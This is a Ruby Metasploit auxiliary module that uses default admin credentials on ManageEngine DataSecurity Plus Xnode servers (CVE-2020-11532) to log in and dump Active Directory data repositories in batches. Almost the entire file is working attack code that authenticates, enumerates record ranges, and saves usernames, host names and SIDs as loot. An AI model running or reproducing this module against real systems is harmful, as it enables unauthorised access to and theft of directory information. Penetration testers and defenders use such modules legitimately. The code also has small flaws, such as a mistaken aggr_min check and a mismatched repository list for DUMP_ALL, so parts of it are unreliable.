##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::ManageengineXnode
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Tcp
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(_info = {})
    super(
      'Name' => 'ManageEngine DataSecurity Plus Xnode Enumeration',
      'Description' => %q{
        The module exploits default admin credentials for the DataEngine
        Xnode server in DataSecurity Plus versions prior to 6.0.1 (6011)
        in order to dump the contents of Xnode data repositories (tables),
        which may contain (a limited amount of) Active Directory
        information including domain names, host names, usernames and SIDs.
        The module can also be used against patched DataSecurity Plus
        versions if the correct credentials are provided.

        By default, the module dumps only the data repositories and fields
        (columns) specified in the configuration file (set via the
        CONFIG_FILE option). The configuration file is then also used to
        add labels to the values sent by Xnode in response to a query.
        It is also possible to use the DUMP_ALL option to obtain all data
        in all known data repositories without specifying data field names.
        However, in the latter case the data won't be labeled.

        This module has been successfully tested against ManageEngine
        DataSecurity Plus 6.0.1 (6010) running on Windows Server 2012 R2
        and DataSecurity Plus 6.0.5 (6052) running on Windows Server 2019.
      },
      'Author' => [
        'Sahil Dhar', # discovery and PoC (for authentication only)
        'Erik Wynter', # @wyntererik - additional research and Metasploit
      ],
      'License' => MSF_LICENSE,
      'References' => [
        ['CVE', '2020-11532'],
        ['PACKETSTORM', '157609'],
      ],
    )
    register_options [
      OptString.new('CONFIG_FILE', [false, 'YAML file specifying the data repositories (tables) and fields (columns) to dump', File.join(Msf::Config.install_root, 'data', 'exploits', 'manageengine_xnode', 'CVE-2020-11532', 'datasecurity_plus_xnode_conf.yaml')]),
      OptBool.new('DUMP_ALL', [false, 'Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.', false]),
      Opt::RPORT(29119)
    ]
  end

  def config_file
    datastore['CONFIG_FILE'].to_s # in case it is nil
  end

  def dump_all
    datastore['DUMP_ALL']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def check
    # create a socket
    res_code, sock_or_msg = create_socket_for_xnode(rhost, rport)
    if res_code == 1
      return Exploit::CheckCode::Unknown(sock_or_msg)
    end

    @sock = sock_or_msg

    # perform basic checks to see if Xnode is running and if so, if it is exploitable
    res_code, res_msg = xnode_check(@sock, username, password)
    case res_code
    when 0
      return Exploit::CheckCode::Appears(res_msg)
    when 1
      return Exploit::CheckCode::Safe(res_msg)
    when 2
      return Exploit::CheckCode::Unknown(res_msg)
    end
  end

  def run
    # check if we already have a socket, if not, create one
    unless @sock
      # create a socket
      res_code, sock_or_msg = create_socket_for_xnode(rhost, rport)
      if res_code == 1
        fail_with(Failure::Unreachable, 'Failed to establish a connection with the remote server')
      end
      @sock = sock_or_msg
    end

    # get the Xnode health status
    health_warning_message = ['Received unexpected response while trying to obtain the Xnode "de_health" status. Enumeration may not work.']
    res_code, res_health = get_response(@sock, action_admin_health, health_warning_message, 'de_health')

    if res_code == 0
      if res_health['response']['de_health'] == 'GREEN'
        print_status('Obtained expected Xnode "de_healh" status: "GREEN".')
      else
        print_warning("Obtained unexpected Xnode \"de_healh\" status: \"#{res_health['response']['de_health']}\"")
      end
    end

    # get the Xnode info
    info_warning_message = ['Received unexpected response while trying to obtain the Xnode version and installation path via the "xnode_info" action. Enumeration may not work.']
    res_code, res_info = get_response(@sock, action_xnode_info, info_warning_message)

    if res_code == 0
      if res_info['response'].keys.include?('xnode_version')
        print_status("Target is running Xnode version: \"#{res_info['response']['xnode_version']}\".")
      else
        print_warning('Failed to obtain the Xnode version.')
      end

      if res_info['response'].keys.include?('xnode_installation_path')
        print_status("Obtained Xnode installation path: \"#{res_info['response']['xnode_installation_path']}\".")
      else
        print_warning('Failed to obtain the Xnode installation path.')
      end
    end

    # obtain the total number of records and the min and max record ID numbers for each repo, which is necessary to enumerate the records
    repo_record_info_hash = {}
    datasecurity_plus_data_repos.each do |repo|
      # send a general query, which should return the "total_hits" parameter that represents the total record count
      res_code, res = get_response(@sock, action_dr_search(repo))
      total_hits = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'total_hits')
      # check if total_hits is an Integer, as that means process_dr_search returned an error code and we should skip to the next repo
      next if total_hits.is_a?(Integer)

      # use "aggr" with the "min" specification for the UNIQUE_ID field in order to obtain the minimum value for this field, i.e. the oldest available record
      aggr_min_query = { 'aggr' => { 'min' => { 'field' => 'UNIQUE_ID' } } }
      res_code, res = get_response(@sock, action_dr_search(repo, ['UNIQUE_ID'], aggr_min_query))
      aggr_min = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'aggr_min')
      # check if aggr_min is an Integer, as that means process_dr_search returned an error code and we should skip to the next repo
      next if aggr_min.is_a?(Integer)

      # use "aggr" with the "max" specification for the UNIQUE_ID field in order to obtain the maximum value for this field, i.e. the most recent record
      aggr_max_query = { 'aggr' => { 'max' => { 'field' => 'UNIQUE_ID' } } }
      res_code, res = get_response(@sock, action_dr_search(repo, ['UNIQUE_ID'], aggr_max_query))
      aggr_max = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'aggr_max')
      # check if aggr_max is an Integer, as that means process_dr_search returned an error code and we should skip to the next repo
      next if aggr_min.is_a?(Integer)

      print_good("Data repository #{repo} contains #{total_hits} records with ID numbers between #{aggr_min} and #{aggr_max}.")

      repo_record_info_hash [repo] = {
        'total_hits' => total_hits.to_i,
        'aggr_min' => aggr_min.to_i,
        'aggr_max' => aggr_max.to_i
      }
    end

    # check if we found any repositories that contained any data
    return if repo_record_info_hash.empty?

    if dump_all
      data_to_dump = ad_audit_plus_data_repos
    else
      data_to_dump = grab_config(config_file)

      case data_to_dump
      when 1
        fail_with(Failure::BadConfig, "Unable to obtain the Xnode data repositories to target from #{config_file} because this file does not exist. Please correct your 'CONFIG_FILE' setting or set 'DUMP_ALL' to true.")
      when 2
        fail_with(Failure::BadConfig, "Unable to read #{config_file}. Check if your 'CONFIG_FILE' setting is correct and make sure the file is readable and properly formatted.")
      when 3
        fail_with(Failure::BadConfig, "The #{config_file} does not seem to contain any data repositories and fields to dump. Please fix your configuration or set 'DUMP_ALL' to true.")
      when 4
        fail_with(Failure::BadConfig, "Unable to obtain the Xnode data repositories to target from #{config_file}. Check if your 'CONFIG_DIR' setting is correct or set 'DUMP_ALL' to true.")
      end
    end

    # try and dump the database tables Xnode has access to
    data_to_dump.each do |repo, fields|
      if fields.blank? && !dump_all
        print_error("Unable to obtain any fields for the data repository #{repo} to query. Skipping this table. Check your config file for this module if this is unintended behavior.")
        next
      end

      # check if we actually found any records for the repo
      next unless repo_record_info_hash.include?(repo)

      total_hits = repo_record_info_hash[repo]['total_hits']
      id_range_lower = repo_record_info_hash[repo]['aggr_min']
      id_range_upper = id_range_lower + 9
      max_id = repo_record_info_hash[repo]['aggr_max']
      query_ct = 0

      results = []
      print_status("Attempting to request #{total_hits} records for data repository #{repo} between IDs #{id_range_lower} and #{max_id}. This could take a while...")
      hit_upper_limit = false
      loop do
        # build a custom query for the unique_id range
        custom_query = { 'query' => "UNIQUE_ID:[#{id_range_lower} TO #{id_range_upper}]" }
        query = action_dr_search(repo, fields, custom_query)
        res_code, res = get_response(@sock, query)
        partial_results = process_dr_search(res, res_code, repo, fields)
        query_ct += 1
        if query_ct % 25 == 0
          print_status("Processed #{query_ct} queries (max 10 records per query) so far. The last queried record ID was #{id_range_upper}. The max ID is #{max_id}...")
        end
        id_range_lower += 10
        id_range_upper += 10
        if id_range_upper > max_id
          if hit_upper_limit
            results += partial_results unless partial_results.is_a?(Integer)
            break
          end
          hit_upper_limit = true
          id_range_upper = max_id
        end
        next if partial_results.is_a?(Integer)

        results += partial_results
      end

      if results.empty?
        print_error("No non-empty records were obtained for #{repo}.")
        next
      end

      outfile_part = "xnode_#{repo.downcase}"
      path = store_loot(outfile_part, 'application/json', rhost, results.to_json, "#{repo}.json")
      print_good("Saving #{results.length} records from the #{repo} data repository to #{path}")
    end
  end
end
